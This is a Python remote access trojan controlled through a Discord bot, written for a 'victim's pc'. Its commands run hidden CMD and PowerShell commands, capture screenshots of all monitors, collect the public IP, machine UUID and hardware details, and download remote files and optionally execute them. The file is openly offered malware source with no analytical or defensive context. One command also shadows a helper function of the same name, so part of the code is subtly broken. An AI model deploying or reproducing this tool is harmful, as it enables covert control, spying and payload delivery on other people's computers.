import platform
import socket
import tempfile
from PIL import Image
import uuid
import discord
from discord.ext import commands
import subprocess
import mss
import psutil
import requests
import getpass

token = input("Bot Token > ")
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='$', intents=intents, help_command=None)

def capture_all_screens():
    with mss.mss() as sct:
        monitors = sct.monitors[1:]  # Skip the first entry (it's a summary)
        width = sum(monitor["width"] for monitor in monitors)
        height = max(monitor["height"] for monitor in monitors)
        
        full_screenshot = Image.new('RGB', (width, height))
        offset_x = 0
        
        for monitor in monitors:
            screenshot = sct.grab(monitor)
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            full_screenshot.paste(img, (offset_x, 0))
            offset_x += monitor["width"]
        
        return full_screenshot

def get_uuid():
    try:
        result = subprocess.check_output(['wmic', 'csproduct', 'get', 'uuid']).decode().split('\n')[1].strip()
        return result
    except subprocess.CalledProcessError:
        return None

def get_hardware_info():
    uuid = get_uuid()
    cpu_info = platform.processor()
    
    ram = psutil.virtual_memory()
    
    disk = psutil.disk_usage('/')
    
    hostname = socket.gethostname()
    
    info = f"UUID: {uuid}\nCPU: {cpu_info}\nRAM: {ram}\nDISK: {disk}\nHOSTNAME: {hostname}"
    return info

def download_run(url, file_name):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            with open(file_name, 'wb') as file:
                file.write(response.content)
            print(f"File downloaded successfully: {file_name}")
            
            subprocess.run(file_name, check=True)
            print(f"File executed successfully: {file_name}")
        else:
            print(f"Failed to download the file. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

def download(url, file_name):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            with open(file_name, 'wb') as file:
                file.write(response.content)
            print(f"File downloaded successfully: {file_name}")
        else:
            print(f"Failed to download the file. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

def cmd_command(command):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    
    result = subprocess.run(["cmd.exe", "/c", command], 
                            capture_output=True, 
                            text=True, 
                            startupinfo=startupinfo)
    return result.stdout.strip()

def ps_command(command):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    
    result = subprocess.run(["powershell.exe", "-Command", command], 
                            capture_output=True, 
                            text=True, 
                            startupinfo=startupinfo)
    return result.stdout.strip()

@bot.command()
async def help(ctx):
    help_text = """
Commands:

$execute_cmd <command>: Execute a CMD command
$execute_ps <command>: Execute a PowerShell command
$grab_ip: Get the public IP address
$hardware_info: Display hardware information
$download <exec> <url> <filename>: Download a file (exec: True/False to execute after download)
$ss: Capture a screnshot of the victims pc
$clear [amount]: Clear messages (default: 5)

Use $<command> to run a command.
"""
    await ctx.send(f"```\n{help_text}\n```")

@bot.command()
async def execute_cmd(ctx, command: str):
    cmd_output = cmd_command(command)
    await ctx.reply(f"OUTPUT:\n```\n{cmd_output}\n```")

@bot.command()
async def execute_ps(ctx, command: str):
    pscmd_output = ps_command(command)
    await ctx.reply(f"OUTPUT:\n```\n{pscmd_output}\n```")

@bot.command()
async def grab_ip(ctx):
    ip = requests.get("https://api.ipify.org").text
    await ctx.reply(f"IP:\n```\n{ip}\n```")

@bot.command()
async def hardware_info(ctx):
    await ctx.reply(f"```\n{get_hardware_info()}\n```")

@bot.command()
async def download(ctx, exec: bool, url: str, filename: str):
    if exec == True:
        download_run(url, filename)
        await ctx.reply(f"Downloaded: `{filename}` from `{url}`\nAnd executed: `{filename}`")
    else:
        download(url, filename)
        await ctx.reply(f"Downloaded: `{filename}` from `{url}`\n")

@bot.command()
async def ss(ctx):
    screenshot = capture_all_screens()
    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
        screenshot.save(temp_file.name)
        await ctx.send(file=discord.File(temp_file.name))

@bot.command()
async def clear(ctx, amount: int = 5):
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"Cleared {amount} messages.", delete_after=5)

bot.run(token)
